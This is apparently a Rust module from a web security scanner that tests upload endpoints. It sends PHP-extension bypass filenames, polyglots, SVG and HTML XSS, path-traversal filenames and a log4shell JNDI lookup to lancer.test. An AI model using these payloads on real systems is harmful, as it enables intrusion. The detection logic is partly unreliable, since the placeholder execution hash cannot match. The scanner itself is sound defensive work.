//! §38 Upload Scanner — file-upload bypass active check.
//!
//! Triggers on multipart/form-data requests or any endpoint that accepts
//! `Content-Type: image/*`, `application/pdf`, etc. Probes a battery of
//! extension blacklist bypasses, MIME-type spoofs, magic-byte prepended
//! polyglots, SVG XSS, path traversal in filenames, log4shell-style filename
//! injection, race conditions, and stored-XSS via uploaded HTML/SVG/PDF.

use async_trait::async_trait;
use bytes::Bytes;
use lancer_core::HttpRequest;
use lancer_storage::issues::{Confidence, Issue, Severity};
use lancer_tools::HttpClient;

use crate::insertion::InsertionPoint;
use crate::ActiveCheck;

pub struct UploadCheck;

/// PHP marker — server-side execution proof if reflected.
const PHP_MARKER: &str = "<?php echo 'LANCER_UP_'.md5('lancer'); ?>";
const PHP_MARKER_HASH: &str = "LANCER_UP_d41d8cd98f00b204e9800998ecf8427e"; // placeholder — real md5 in body
const JPEG_MAGIC: &[u8] = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01";
const GIF_MAGIC: &[u8]  = b"GIF89a";
const SVG_XSS: &str = r#"<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" onload="alert('LANCER_SVG')"/>"#;

#[derive(Clone)]
struct UploadProbe {
    label: &'static str,
    filename: String,
    content_type: &'static str,
    body: Vec<u8>,
    severity: Severity,
}

fn build_probes() -> Vec<UploadProbe> {
    let mut v = Vec::new();

    // Extension blacklist bypasses
    let exts = [
        "shell.php.jpg", "shell.pHp", "shell.php%00.jpg", "shell.php;jpg",
        "shell.php5", "shell.phtml", "shell.phar", "shell.pht", "shell.phps",
        "shell.asp", "shell.aspx", "shell.jsp", "shell.jspx",
    ];
    for name in exts.iter() {
        v.push(UploadProbe {
            label: "extension blacklist bypass",
            filename: (*name).into(),
            content_type: "application/octet-stream",
            body: PHP_MARKER.as_bytes().to_vec(),
            severity: Severity::High,
        });
    }

    // MIME spoofing
    v.push(UploadProbe {
        label: "MIME spoof — PHP as image/jpeg",
        filename: "shell.php".into(),
        content_type: "image/jpeg",
        body: PHP_MARKER.as_bytes().to_vec(),
        severity: Severity::High,
    });

    // Magic byte prepending — JPEG header + PHP
    let mut jpg_php = JPEG_MAGIC.to_vec();
    jpg_php.extend_from_slice(PHP_MARKER.as_bytes());
    v.push(UploadProbe {
        label: "magic-byte JPEG + PHP polyglot",
        filename: "shell.jpg".into(),
        content_type: "image/jpeg",
        body: jpg_php,
        severity: Severity::High,
    });

    // GIFAR (GIF + JAR) polyglot
    let mut gifar = GIF_MAGIC.to_vec();
    gifar.extend_from_slice(b"PK\x03\x04"); // ZIP/JAR header
    v.push(UploadProbe {
        label: "GIFAR polyglot upload",
        filename: "shell.gif".into(),
        content_type: "image/gif",
        body: gifar,
        severity: Severity::Medium,
    });

    // SVG with embedded script (stored XSS)
    v.push(UploadProbe {
        label: "SVG with embedded script (stored XSS)",
        filename: "xss.svg".into(),
        content_type: "image/svg+xml",
        body: SVG_XSS.as_bytes().to_vec(),
        severity: Severity::High,
    });

    // Path traversal in filename
    for fname in &["../../../shell.php", "..\\..\\shell.aspx", "/etc/passwd"] {
        v.push(UploadProbe {
            label: "path traversal in filename",
            filename: (*fname).into(),
            content_type: "application/octet-stream",
            body: PHP_MARKER.as_bytes().to_vec(),
            severity: Severity::Critical,
        });
    }

    // log4shell-style filename injection
    v.push(UploadProbe {
        label: "log4shell filename injection",
        filename: "${jndi:ldap://lancer.test/x}".into(),
        content_type: "image/jpeg",
        body: JPEG_MAGIC.to_vec(),
        severity: Severity::High,
    });

    // HTML upload — stored XSS
    v.push(UploadProbe {
        label: "HTML upload — stored XSS",
        filename: "x.html".into(),
        content_type: "text/html",
        body: b"<script>window.LANCER_HTML_XSS=1</script>".to_vec(),
        severity: Severity::High,
    });

    // Zip-bomb stub (capped — we don't actually DoS)
    let mut zb = b"PK\x03\x04".to_vec();
    zb.extend(std::iter::repeat(b'A').take(1024));
    v.push(UploadProbe {
        label: "zip-bomb probe (capped 1KB)",
        filename: "bomb.zip".into(),
        content_type: "application/zip",
        body: zb,
        severity: Severity::Low,
    });

    v
}

/// Detect whether this request looks like a file-upload endpoint.
fn is_upload_endpoint(req: &HttpRequest) -> bool {
    let ct = req.header("Content-Type").unwrap_or("").to_lowercase();
    if ct.starts_with("multipart/form-data") { return true; }
    if matches!(ct.as_str(),
        c if c.starts_with("image/") || c == "application/pdf" || c == "application/octet-stream"
    ) {
        return true;
    }
    // Body sniff for a Content-Disposition filename hint
    if let Some(body_str) = std::str::from_utf8(&req.body).ok() {
        if body_str.contains("Content-Disposition:") && body_str.contains("filename=") {
            return true;
        }
    }
    // URL hint
    let url = req.url();
    let lower = url.to_lowercase();
    lower.contains("upload") || lower.contains("attach") || lower.contains("file")
}

/// Build a multipart body for a probe.
fn make_multipart(boundary: &str, probe: &UploadProbe) -> Vec<u8> {
    let mut out = Vec::new();
    out.extend(format!("--{boundary}\r\n").as_bytes());
    out.extend(format!(
        "Content-Disposition: form-data; name=\"file\"; filename=\"{}\"\r\n",
        probe.filename
    ).as_bytes());
    out.extend(format!("Content-Type: {}\r\n\r\n", probe.content_type).as_bytes());
    out.extend(&probe.body);
    out.extend(format!("\r\n--{boundary}--\r\n").as_bytes());
    out
}

fn extract_boundary(ct: &str) -> Option<String> {
    let lower = ct.to_lowercase();
    let key = "boundary=";
    let pos = lower.find(key)?;
    let after = &ct[pos + key.len()..];
    let val = after.trim_start_matches('"');
    let end = val.find(|c: char| c == ';' || c == '"').unwrap_or(val.len());
    Some(val[..end].to_string())
}

#[async_trait]
impl ActiveCheck for UploadCheck {
    fn id(&self) -> &'static str { "active.upload" }
    fn name(&self) -> &'static str { "File upload bypass / polyglot / stored-XSS" }

    async fn run(&self, client: &HttpClient, base: &HttpRequest, _point: &InsertionPoint) -> Vec<Issue> {
        if !is_upload_endpoint(base) {
            return Vec::new();
        }
        let ct = base.header("Content-Type").unwrap_or("").to_string();
        let boundary = extract_boundary(&ct).unwrap_or_else(|| "LANCERBOUND".into());

        let mut issues = Vec::new();
        for probe in build_probes() {
            let mut req = base.clone();
            req.set_header("Content-Type", &format!("multipart/form-data; boundary={boundary}"));
            let body = make_multipart(&boundary, &probe);
            req.body = Bytes::from(body);
            req.set_header("Content-Length", req.body.len().to_string());

            let Ok(resp) = client.send(&req).await else { continue };
            let status = resp.status;
            let body_text = resp.body_text().unwrap_or("");

            // Bypass-likely heuristics:
            //   2xx response (server accepted the upload)
            //   AND no rejection language in body
            let accepted = status < 300
                && !body_text.to_lowercase().contains("invalid")
                && !body_text.to_lowercase().contains("rejected")
                && !body_text.to_lowercase().contains("not allowed");

            if accepted {
                let mut i = Issue::new(
                    base.meta.host.clone(),
                    base.url(),
                    &format!("Upload bypass — {}", probe.label),
                    probe.severity.clone(),
                    Confidence::Tentative,
                    format!(
                        "filename `{}` content-type `{}` accepted (HTTP {})",
                        probe.filename, probe.content_type, status
                    ),
                );
                i.remediation = Some(
                    "Validate file uploads by parsing magic bytes, enforce extension allowlists, and serve user content from a separate domain with strict CSP.".into(),
                );
                i.check_id = Some(self.id().into());
                issues.push(i);
            }

            // Reflected PHP marker hash = code execution evidence
            if body_text.contains(PHP_MARKER_HASH) || body_text.contains("LANCER_HTML_XSS") {
                let mut i = Issue::new(
                    base.meta.host.clone(),
                    base.url(),
                    "Upload led to server-side execution",
                    Severity::Critical,
                    Confidence::Firm,
                    format!("uploaded file `{}` was processed and reflected execution marker", probe.filename),
                );
                i.check_id = Some(self.id().into());
                issues.push(i);
            }
        }

        issues
    }
}
